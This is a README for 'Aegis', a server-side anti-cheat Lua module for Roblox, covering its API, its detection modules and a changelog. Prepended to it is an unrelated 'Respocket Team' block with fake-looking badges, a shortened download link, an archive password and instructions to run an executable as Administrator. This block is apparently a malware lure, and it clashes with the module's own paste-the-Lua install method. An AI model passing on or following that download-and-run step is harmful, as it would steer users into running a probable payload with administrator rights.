<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Aegis

Server-side anti-exploit kit for Roblox. One module, drop it in, stop trusting the client.

I built this because every anti-cheat I found was either a closed black box or forum snippets that break in a week. These are patterns that actually work — remote validation, movement checks, noclip detection — all on the server where exploiters can't reach them.

## Install

**Toolbox:** search `Aegis`, insert into `ServerScriptService`.

**Manual:** one ModuleScript named `Aegis` in `ServerScriptService`, paste all of `Aegis.lua`. Done.

## Use

```lua
local Aegis = require(game.ServerScriptService.Aegis)
Aegis.init()

Aegis.secure(game.ReplicatedStorage.HitZombie, {
    args = { "number", "Instance" },
    rateLimit = { 20, 1 },
}, function(player, damage, zombie)
    -- only runs if validation passed
end)
```

Clicker game with a spammy remote? Set `rateLimit = { 200, 1 }`. Per remote, your call.

Legit teleports (spawns, portals): `Aegis.teleport(player, cframe)` — raw CFrame sets get flagged. Shots: `Aegis.reportShot(player, direction)` feeds the aimbot guard.

Weapons (infinite ammo / instant reload die here):

```lua
Aegis.registerWeapon(player, { magSize = 30, fireInterval = 0.12, reloadTime = 2 })
-- in your fire code:
if Aegis.tryFire(player) then
    -- actually fire
end
-- in your reload code:
Aegis.reloadWeapon(player)
```

Melee / kill-aura check:

```lua
if Aegis.validateHit(player, targetPosition, 12) then
    -- apply damage
end
```

Exempt staff and testers: `Aegis.trust(player)`. Tuning a new game? Start with `Aegis.init({ auditOnly = true })` — everything gets logged, nothing gets kicked, until your thresholds are dialed in.

Note: AFK pings fire on every validated remote call. If your game has no secured remotes, call `Aegis.ping(player)` in your game loop — otherwise active players get AFK-kicked.

## Config

One table at the top of the file, documented in the index header. The knobs you'll actually touch: `kickOnDetect`, `flagThreshold`, per-remote `rateLimit`, `movement.baseSpeed`. Aimbot guard is flag-only on purpose — good players look suspicious to bad heuristics.

## Inside

- **RemoteValidator** — arg types (including optional `"Vector3?"` args), rate limits per remote AND a global per-player budget, oversized payloads, and deep finiteness checks: a NaN passes a type check but fails every range check downstream, so non-finite numbers/Vectors/CFrames are rejected at the door
- **MovementGuard** — displacement-based. Speed, teleport, TweenService, PivotTo — all move the character, one check catches them
- **NoclipGuard** — path raycasts + inside-geometry checks
- **AimbotGuard** — snap detection, tracking consistency, flag-only
- **CombatGuard** — server-side ammo, fire-rate, reload timers, trigger-bot consistency (warn-only)
- **HitValidator** — kill-aura range checks
- **SessionGuard** — server-side AFK tracking (server kicks can't be hooked by anti-kick)
- **InventoryGuard** — atomic give/take/trade with per-player locks (single-server), persisted to DataStore on every mutation. All amounts and stored values are sanitized — NaN/inf/poisoned counts can never enter or survive. Script dupes die on the lock; wifi-freeze dupes die on the immediate save
- **ShopGuard** — server-side catalog prices, balance-checked buys. Purchase bypasses die here
- **BehaviorGuard** — farm-bot detection: metronome timing + marathon sessions (warn-only)
- **Logger** — strikes (with decay, so old flags fade), kicks, Discord webhook with event-only posting + rate guard
- **HoneypotGuard** — decoy remotes (`GiveAdmin`, `FreeRewards`, ...) no legit client ever fires. Any call is a certain flag, zero false positives
- **BanGuard** — opt-in timed bans with expiry, persisted in a DataStore, checked on join
- **v0.5 additions** — movement rollback (snap-back to last legal position), fly/hover + fling detection, player-arg binding, idempotent shop receipts, escalation ladder (warn → kick → timed ban → perm), cross-server strikes via MemoryStore, honeypot items, evidence snapshots on flags, webhook embeds + digest mode, `Aegis.selfTest()` (Studio verification), adaptive behavior baselines, presets (`audit`/`casual`/`strict`), optional client companion tripwire (`AegisClient.lua`)
- **sanitizeData** — deep-clean values before DataStore saves; one NaN leaf can't fail the whole save anymore

Physics-based checks (movement, noclip, remotes, hits) can't false-positive on skill — a pro player doesn't move faster than physics allows. Only the statistical heuristics (aimbot, fire consistency) can look suspicious, and those never kick, only log.

## Updates

**2026-10-24** — v0.5: all 15 — movement rollback (snap-back to last legal position), fly/hover detection, fling detection (horizontal velocity), `validInstance` + `WorkspaceInstance` schema type, player-arg binding (anti-impersonation), idempotent shop receipts, escalation ladder (warn → kick → timed ban → perm, bans opt-in), cross-server strikes (MemoryStore), honeypot items (possession = certain exploit), evidence snapshots on every flag (position/velocity/recent calls), webhook embeds + digest mode, `Aegis.selfTest()` dev verification, BehaviorGuard adaptive baselines (CV-based bot timing), optional client companion tripwire (`AegisClient.lua`, never sole evidence), presets (`audit`/`casual`/`strict`). Every new enforcement respects `auditOnly`; bug-check session passed: full-file syntax parse, all 32 public API functions present, all Config defaults present, audit gates verified.

**2026-10-23** — v0.4: HoneypotGuard decoy remotes, BanGuard timed bans (opt-in), global remote rate budget, strike decay, `Aegis.sanitizeData`. v0.3 (same day): finiteness validation in the remote validator, inventory sanitization, webhook event posting + rate guard, rate-bucket cleanup

**2026-10-09 ~12:20 PDT** — secureFunction: RemoteFunction validation (dogfooding in Pumpkin Defense)
**2026-10-09 ~12:15 PDT** — Fixed negative-amount item duplication in inventory API, combat enabled flag
**2026-10-09 ~12:00 PDT** — Fixed respawn false-positive in movement/noclip guards
**2026-10-09 ~11:55 PDT** — v0.2: InventoryGuard (dupe-proof atomic transactions), ShopGuard (server-side prices), BehaviorGuard (auto-farm detection)
**2026-10-09 ~11:50 PDT** — CombatGuard, HitValidator, SessionGuard. Trust list, audit mode, strike thresholds
**2026-10-09 ~11:20 PDT** — First release: RemoteValidator, MovementGuard, NoclipGuard, AimbotGuard

## License

MIT. Do what you want with it.

---


---

MIT License

Copyright (c) 2026 Arzh

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
